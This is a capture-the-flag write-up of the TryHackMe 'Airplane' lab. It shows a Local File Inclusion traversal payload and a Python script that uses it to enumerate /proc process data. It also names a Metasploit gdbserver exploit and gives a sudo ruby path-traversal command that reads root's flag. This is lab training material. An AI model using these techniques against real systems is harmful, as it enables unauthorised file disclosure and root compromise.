# Airplane (Tryhackme)

**This writeup will guide you through the “Airplane” room on TryHackMe, from start to finish. We’ll cover the steps, tools, and techniques needed to complete the challenge, from initial scanning to gaining root access. Whether you’re a beginner or an experienced hacker, this guide will help you navigate and conquer the “Airplane” room. Let’s dive in and take off on this cybersecurity adventure!**

*The first step is to perform an Nmap scan to identify open ports and services on the target machine.*
![Screenshot 2024-10-08 133229](https://github.com/user-attachments/assets/43286e92-2b9d-4c50-881a-78926570a938)

now first configure /etc/hosts to resolve given ip to airplane.thm

![Screenshot 2024-10-08 133529](https://github.com/user-attachments/assets/f3a6a56e-fa89-41c0-8b8b-5c7c0f7a4cbb)

*Upon visiting airplane.thm:8000, we discovered a Local File Inclusion (LFI) vulnerability.*

![Screenshot 2024-10-08 133607](https://github.com/user-attachments/assets/f958cd7f-dd68-4648-bbdc-c09000321196)

By visiting using burpsuite /proc/net/tcp, we observed several running services and noted that port 6048 → hex (17A0) also has an active unknown service
![Screenshot 2024-10-08 133631](https://github.com/user-attachments/assets/4731dcb5-7169-4bf8-ba14-e9f6c24e02bc)

I use chat-gpt to write python code to find pid of services running on port 6048.

```
import requests

def read_file(base_url, path):
    file_url = f"{base_url}/?page=../../../../{path}"
    try:
        response = requests.get(file_url)
        if response.status_code == 200:
            return response.text
        else:
            return None
    except Exception as e:
        print(f"Error reading {path}: {e}")
        return None

def find_pid_by_port(base_url, port):
    for pid in range(1, 5000):  # Adjust the range based on the expected number of PIDs
        cmdline_path = f"proc/{pid}/cmdline"
        cmdline = read_file(base_url, cmdline_path)
        if cmdline:
            if str(port) in cmdline:
                return pid
    return None

# Example usage
base_url = 'http://airplane.thm:8000'
port = '6048'
pid = find_pid_by_port(base_url, port)
if pid:
    cmdline = read_file(base_url, f"proc/{pid}/cmdline")
    status = read_file(base_url, f"proc/{pid}/status")
    print(f'PID using port {port}: {pid}')
    print(f'Command line: {cmdline}')
    print(f'Status: {status}')
else:
    print(f'No process found using port {port}')
```
I discovered that gdbserver is running on port 6048 with PID 524.
![Screenshot 2024-10-08 133856](https://github.com/user-attachments/assets/5b0db5a8-fe92-4f81-9ab3-6261f5162032)

I found out that there is an exploit available for gdbserver, so I used the Metasploit exploit multi/gdb/gdb_server_exec. and fill all required options.

Here is the Ruby script I wrote to read root.txt:
```
# read_root.rb
puts File.read('/root/root.txt')
```

I saved this script in my current directory and executed it using the following command:

sudo /usr/bin/ruby /root/../home/carlos/read_root.rb
